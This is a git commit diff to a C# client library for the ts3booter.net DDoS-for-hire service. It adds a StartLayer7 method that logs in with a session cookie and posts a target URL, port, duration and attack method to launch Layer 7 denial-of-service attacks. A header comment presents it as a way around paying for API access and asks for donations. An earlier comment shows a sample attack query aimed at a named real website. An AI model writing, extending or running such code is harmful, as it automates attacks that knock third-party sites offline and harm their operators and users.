b2a327afe324ae9c2d3b125330e4c006894c2526
JPN <jpn@isaidpower.dev>
2022-10-13 21:18:44 +0300

    Added Layer7 to the API

--- ts3booter/MainAPI/Ts3BooterAPI.cs
+++ ts3booter/MainAPI/Ts3BooterAPI.cs
@@ -12,6 +12,21 @@ namespace ts3booter.MainAPI
 {
     public class Ts3Booter
     {
+        /*
+         *              Ts3Booter.net Private API
+         *                              by JPN
+         *    This API allows the communication between a C#
+         *    program and the ts3booter.net website without 
+         *    having to buy a package that has API access included.
+         *    
+         *    Full functionality is not guaranteed by using this API
+         *    and I am not responsible for the end product that
+         *    you may end with by creating and using a product
+         *    that makes use of this API.
+         *    
+         *    If you like this little file you can contact me on Discord
+         *    to make a small donation (JPN#6969).
+         */
         public string user, pass;
         private string phpsessionid;
         private bool logged_in = false;
@@ -136,6 +151,41 @@ namespace ts3booter.MainAPI
                 }
             }
             // host%5B%5D=https%3A%2F%2Flgbt.foundation%2F&port=443&time=60&method=HTTP-LOAD&action-ddos=
+        }
+        public bool StartLayer7(string url, string method, int port = 443, int time = 120)
+        {
+            if (logged_in == false)
+            {
+                return false;
+            }
+            var layer4 = (HttpWebRequest)WebRequest.Create("https://ts3booter.net/home");
+            CookieContainer cookie = new CookieContainer();
+            cookie.Add(new Cookie("PHPSESSID", phpsessionid) { Domain = "ts3booter.net" });
+            layer4.CookieContainer = cookie;
+            layer4.Method = "POST";
+            string attack_query = "host%5B%5D=" + HttpUtility.UrlEncode(url) + "&port=" + HttpUtility.UrlEncode(port.ToString()) + "&time=" + HttpUtility.UrlEncode(time.ToString()) + "&method=" + method + "&action-ddos=";
+            layer4.ContentType = "application/x-www-form-urlencoded";
+            using (StreamWriter sw = new StreamWriter(layer4.GetRequestStream()))
+            {
+                sw.WriteLine(attack_query);
+            }
+            HttpWebResponse status = (HttpWebResponse)layer4.GetResponse();
+            using (StreamReader reader = new StreamReader(status.GetResponseStream()))
+            {
+                string response = reader.ReadToEnd();
+                if (response.Contains("icon fa fa-ban"))
+                {
+                    return false;
+                }
+                else if (response.Contains("icon fas fa-check-circle"))
+                {
+                    return true;
+                }
+                else
+                {
+                    return false;
+                }
+            }
         }
 
     }
